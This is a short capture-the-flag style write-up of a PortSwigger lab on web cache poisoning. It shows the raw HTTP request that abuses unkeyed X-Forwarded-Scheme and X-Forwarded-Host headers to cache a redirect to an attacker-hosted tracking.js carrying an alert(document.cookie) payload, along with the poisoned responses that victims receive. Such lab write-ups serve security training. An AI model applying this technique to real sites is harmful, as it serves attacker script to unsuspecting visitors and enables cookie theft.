# [Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

## Lab

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

## Analysis

unkeyed-headers: `X-Forwarded-Scheme` and `X-Forwarded-Host`

## Solutions

craft response at exploit-server:

- file: `/resources/js/tracking.js`
- body: `alert(document.cookie)`

cache poisoning:

```http
GET /resources/js/tracking.js HTTP/1.1
Host: id.web-security-academy.net
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-id.exploit-server.net
Connection: close

HTTP/1.1 302 Found
Location: https://exploit-id.exploit-server.net/resources/js/tracking.js
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 0
```

What will happen on the victim's side:

```http
GET / HTTP/1.1
Host: 0a4f00840335e2bec05e726800c20001.web-security-academy.net

HTTP/1.1 200 OK

<script type="text/javascript" src="/resources/js/tracking.js">
```

```http
GET /resources/js/tracking.js HTTP/1.1
Host: 0a4f00840335e2bec05e726800c20001.web-security-academy.net

HTTP/1.1 302 Found
Location: https://exploit-0ace00a1034fe28cc0e4716701530056.exploit-server.net/resources/js/tracking.js
Cache-Control: max-age=30
Age: 22
X-Cache: hit
Connection: close
Content-Length: 0
```

=> boom, solved.
